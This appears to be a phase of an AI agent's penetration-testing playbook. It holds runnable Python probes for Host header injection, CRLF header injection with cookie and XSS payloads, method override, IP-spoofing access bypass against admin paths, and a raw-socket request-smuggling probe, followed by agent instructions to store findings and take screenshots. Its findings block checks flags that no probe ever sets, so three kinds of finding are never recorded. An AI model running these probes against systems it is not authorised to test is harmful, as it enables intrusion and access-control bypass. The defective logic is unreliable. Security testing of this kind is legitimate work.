**Phase 16 — HTTP Protocol & Header Attacks**
  These are server-level tests that go beyond the application layer.
  Use raw sockets where requests() cannot send malformed/crafted packets.

  ── 10a. Host Header Injection ──────────────────────────────────────
  Test if the server reflects or trusts an arbitrary Host header.
  Impact: password-reset poisoning, cache poisoning, SSRF.
    from urllib.parse import urlparse
    hostname = urlparse(BASE).hostname
    # Test 1: inject evil host
    r1 = session.get(BASE, headers={'Host': 'evil.com'}, verify=False)
    if 'evil.com' in r1.text:
        print('[HIGH] Host header reflected in response — Host injection confirmed!')
        print('Evidence:', r1.text[:300])
    else:
        print('[INFO] Host header not reflected')
    # Test 2: duplicate Host headers via X-Forwarded-Host
    r2 = session.get(BASE, headers={'X-Forwarded-Host': 'evil.com'}, verify=False)
    if 'evil.com' in r2.text:
        print('[HIGH] X-Forwarded-Host reflected — cache/reset poisoning possible')
    # Test 3: password reset link poisoning (if reset endpoint exists)
    # Send reset request with poisoned Host, check if response/email would use evil.com

  ── 10b. CRLF / Header Injection ────────────────────────────────────
  Test if \r\n in any input injects new HTTP headers into the RESPONSE.
  Test vectors: URL path, query params, POST body, custom request headers.
  Also test multi-header injection (chained CRLF = multiple headers at once).
  Impact: response splitting, XSS via Set-Cookie, cache poisoning, session fixation.
  ```python
  import urllib.parse, requests as _req

  _UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
  _crlf_sess = _G.get('session_a') or _G.get('session') or _req.Session()

  # CRLF encodings — raw, URL-encoded, double-encoded
  _CRLF_VARIANTS = ['\r\n', '%0d%0a', '%0D%0A', '%0a', '%0d', '\n']

  # Single-header payloads
  _CRLF_SINGLE = [
      'X-CRLF-Test: injected',
      'Set-Cookie: crlf_pwned=1; Path=/',
      'X-XSS: <script>alert(1)</script>',
  ]

  # Multi-header payload — inject TWO headers at once
  _CRLF_MULTI = [
      'X-Hdr1: val1\r\nX-Hdr2: val2',
      'X-Hdr1: val1\r\nSet-Cookie: multi_pwned=1',
      'X-Hdr1: val1\r\nContent-Length: 0\r\nX-Hdr2: val2',
  ]

  def _check_crlf_response(r, label):
      # Check actual parsed header keys — NOT str(r.headers) which includes header
      # values (e.g. Location URL) that may reflect the payload URL-encoded.
      # r.headers.get() only returns a value if the key exists as a real header.
      if r.headers.get('X-CRLF-Test') or r.headers.get('X-Hdr1') or r.headers.get('X-Hdr2'):
          print(f'[HIGH] CRLF injection CONFIRMED — {label}')
          print(f'  Injected header found in response: {dict(r.headers)}')
          return True
      if r.cookies.get('crlf_pwned') or r.cookies.get('multi_pwned'):
          print(f'[HIGH] CRLF Set-Cookie injection CONFIRMED — {label}')
          print(f'  Injected cookie found: {dict(r.cookies)}')
          return True
      if r.headers.get('X-XSS'):
          print(f'[HIGH] XSS via CRLF header injection CONFIRMED — {label}')
          return True
      return False

  _crlf_found = False

  for _enc in _CRLF_VARIANTS:
      if _crlf_found:
          break
      for _hdr in (_CRLF_SINGLE + _CRLF_MULTI):
          _inj = _enc + _hdr

          # ── Vector 1: URL path injection ──────────────────────────────
          time.sleep(0.4)
          try:
              _r = _req.get(BASE.rstrip('/') + '/index' + _inj,
                            verify=False, allow_redirects=False, timeout=8,
                            headers={'User-Agent': _UA})
              if _check_crlf_response(_r, f'URL path + {repr(_enc)}'):
                  _crlf_found = True; break
          except Exception:
              pass

          # ── Vector 2: Query string parameter ──────────────────────────
          time.sleep(0.4)
          try:
              _r = _req.get(BASE, params={'q': 'test' + _inj, 'page': '1' + _inj},
                            verify=False, allow_redirects=False, timeout=8,
                            headers={'User-Agent': _UA})
              if _check_crlf_response(_r, f'Query param + {repr(_enc)}'):
                  _crlf_found = True; break
          except Exception:
              pass

          # ── Vector 3: POST body parameter ─────────────────────────────
          time.sleep(0.4)
          try:
              _r = _req.post(BASE, data={'input': 'test' + _inj, 'name': 'test' + _inj},
                             verify=False, allow_redirects=False, timeout=8,
                             headers={'User-Agent': _UA})
              if _check_crlf_response(_r, f'POST body + {repr(_enc)}'):
                  _crlf_found = True; break
          except Exception:
              pass

          # ── Vector 4: Custom request header value ─────────────────────
          time.sleep(0.4)
          try:
              # Inject into common reflected/forwarded headers
              for _hname in ['X-Forwarded-For', 'Referer', 'X-Custom-Header']:
                  _r = _req.get(BASE, verify=False, allow_redirects=False, timeout=8,
                                headers={'User-Agent': _UA, _hname: '1.2.3.4' + _inj})
                  if _check_crlf_response(_r, f'Request header {_hname} + {repr(_enc)}'):
                      _crlf_found = True; break
              if _crlf_found:
                  break
          except Exception:
              pass

  if not _crlf_found:
      print('[INFO] No CRLF injection detected across URL/query/POST/header vectors')
  ```

  ── 10c. HTTP Method Override ────────────────────────────────────────
  Some frameworks honour X-HTTP-Method-Override to bypass method restrictions.
  Impact: access DELETE/PUT via POST if firewall only blocks direct method.
    override_headers = [
        'X-HTTP-Method-Override',
        'X-HTTP-Method',
        'X-Method-Override',
    ]
    for hdr in override_headers:
        r = session.post(BASE, headers={hdr: 'DELETE'}, verify=False, timeout=10)
        if r.status_code not in [404, 405, 403, 400]:
            print(f'[MEDIUM] {hdr}: DELETE override returned {r.status_code} — method restriction bypassable')
        else:
            print(f'[INFO] {hdr}: DELETE → {r.status_code} (blocked correctly)')

  ── 10d. IP Spoofing / Access Control Bypass ─────────────────────────
  Test if the server trusts X-Forwarded-For to bypass IP-based restrictions.
    spoof_headers = {
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'Forwarded': 'for=127.0.0.1',
    }
    r_normal = session.get(BASE, verify=False, timeout=10)
    r_spoofed = session.get(BASE, headers=spoof_headers, verify=False, timeout=10)
    if r_spoofed.status_code != r_normal.status_code:
        print(f'[HIGH] IP spoof header changed response: {r_normal.status_code} → {r_spoofed.status_code}')
    # Also test on admin/restricted paths
    for path in ['/admin', '/admin/', '/api/admin', '/management']:
        r_spoof = session.get(BASE + path, headers={'X-Forwarded-For': '127.0.0.1'}, verify=False)
        r_plain = session.get(BASE + path, verify=False)
        if r_spoof.status_code < r_plain.status_code or \
           (r_spoof.status_code == 200 and r_plain.status_code in [401, 403]):
            print(f'[HIGH] {path}: accessible with X-Forwarded-For: 127.0.0.1 but not without!')
            print(f'  Normal: {r_plain.status_code}  Spoofed: {r_spoof.status_code}')

  ── 10e. HTTP Request Smuggling Probe (CL.TE) ────────────────────────
  Send a request with both Content-Length and Transfer-Encoding headers.
  A vulnerable server may desync — probe using raw socket (requests cannot do this).
  Impact: bypass security controls, poison shared caches, hijack other users' requests.
    import socket, ssl as _ssl
    hostname = urlparse(BASE).hostname
    port = 443 if BASE.startswith('https') else 80
    use_ssl = BASE.startswith('https')

    # CL.TE probe: CL=6 but body is a valid 0-length chunk + smuggled prefix
    smuggle_payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {hostname}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"G"
    )
    try:
        sock = socket.create_connection((hostname, port), timeout=10)
        if use_ssl:
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=hostname)
        sock.sendall(smuggle_payload.encode())
        resp_raw = b''
        sock.settimeout(5)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                resp_raw += chunk
        except socket.timeout:
            pass
        sock.close()
        resp_text = resp_raw.decode('utf-8', errors='replace')
        first_line = resp_text.split('\r\n')[0] if resp_text else ''
        print(f'[INFO] Smuggling CL.TE probe — server response: {first_line}')
        if '400' in first_line:
            print('[INFO] Server returned 400 — likely rejecting malformed request (good)')
        elif '200' in first_line or '301' in first_line or '302' in first_line:
            print('[MEDIUM] Server accepted CL+TE request — manual smuggling test recommended')
            print('         Use smuggler.py or Burp HTTP Request Smuggler for full confirmation')
    except Exception as e:
        print(f'[INFO] Smuggling probe error: {e}')

  ── 10f. Oversized / Malformed Headers ──────────────────────────────
  Test how the server handles abnormal header values.
    # Oversized header (buffer overflow probe)
    time.sleep(0.5)
    r = session.get(BASE, headers={'X-Test': 'A' * 8192}, verify=False, timeout=10)
    print(f'[INFO] Oversized header (8KB): {r.status_code}')
    if r.status_code == 500:
        print('[MEDIUM] Server 500 on oversized header — may indicate poor error handling')

    # Null byte in header value
    time.sleep(0.5)
    try:
        r = session.get(BASE, headers={'X-Test': 'value\x00injected'}, verify=False, timeout=10)
        print(f'[INFO] Null byte in header: {r.status_code}')
    except Exception as e:
        print(f'[INFO] Null byte header rejected by client: {e}')

    # HTTP/1.0 downgrade — check if server discloses more on older protocol
    import http.client
    try:
        if BASE.startswith('https'):
            conn = http.client.HTTPSConnection(hostname, timeout=10,
                context=_ssl.create_default_context())
        else:
            conn = http.client.HTTPConnection(hostname, timeout=10)
        conn._http_vsn = 10
        conn._http_vsn_str = 'HTTP/1.0'
        conn.request('GET', '/')
        resp10 = conn.getresponse()
        print(f'[INFO] HTTP/1.0 response: {resp10.status} {resp10.reason}')
        server10 = resp10.getheader('Server','')
        if server10:
            print(f'[INFO] Server header on HTTP/1.0: {server10}')
    except Exception as e:
        print(f'[INFO] HTTP/1.0 test: {e}')

---

**MANDATORY — Store HTTP attack findings before moving on:**

```python
_G.setdefault('FINDINGS', [])

# Host header injection
if '_host_injection' in dir() and _host_injection:
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'Host Header Injection',
        'url': BASE,
        'method': 'GET',
        'parameter': 'Host',
        'payload': 'evil.com',
        'evidence': 'Injected Host header value was reflected in the server response',
        'impact': 'Cache poisoning, password reset hijacking, server-side request routing manipulation',
        'screenshot': '',
    })

# CRLF injection
if '_crlf_found' in dir() and _crlf_found:
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'CRLF / HTTP Header Injection',
        'url': BASE,
        'method': 'POST',
        'evidence': 'Injected CRLF sequence resulted in arbitrary header in response',
        'impact': 'HTTP response splitting, session fixation, XSS via injected headers',
        'screenshot': '',
    })

# IP spoofing bypass
if '_ip_spoof_found' in dir() and _ip_spoof_found:
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'IP Spoofing Access Control Bypass',
        'url': BASE,
        'method': 'GET',
        'evidence': 'X-Forwarded-For header bypassed IP-based access control',
        'impact': 'Bypass of IP-based restrictions, unauthorized access to admin endpoints',
        'screenshot': '',
    })

# HTTP request smuggling
if '_smuggling_found' in dir() and _smuggling_found:
    _G['FINDINGS'].append({
        'severity': 'MEDIUM',
        'title': 'HTTP Request Smuggling (CL+TE)',
        'url': BASE,
        'method': 'POST',
        'evidence': 'Server accepted conflicting Content-Length and Transfer-Encoding headers',
        'impact': 'Request smuggling, cache poisoning, bypassing security controls',
        'screenshot': '',
    })

print(f"[+] HTTP attack phase findings stored")

# POST-PHASE SCREENSHOT CHECKPOINT — verify findings with screenshots
print("\n[SCREENSHOT CHECKPOINT] Verify all HTTP attack findings:")
import time
for finding in _G['FINDINGS']:
    if 'HTTP' in finding.get('title', '') or 'Header' in finding.get('title', '') or 'Smuggling' in finding.get('title', '') or 'Spoofing' in finding.get('title', ''):
        if not finding.get('screenshot'):
            print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
            print(f"    Navigate to: {finding.get('url')}")
            print(f"    browser_action(action='navigate', url='{finding.get('url')}')")
            print(f"    browser_action(action='screenshot', filename='phase_16_http_{finding.get('title').replace(' ', '_').lower()}.png')")
            print(f"    Update finding['screenshot'] with the filename")
print("\n  After confirming each finding: if screenshot shows false positive, remove it from _G['FINDINGS']")
```
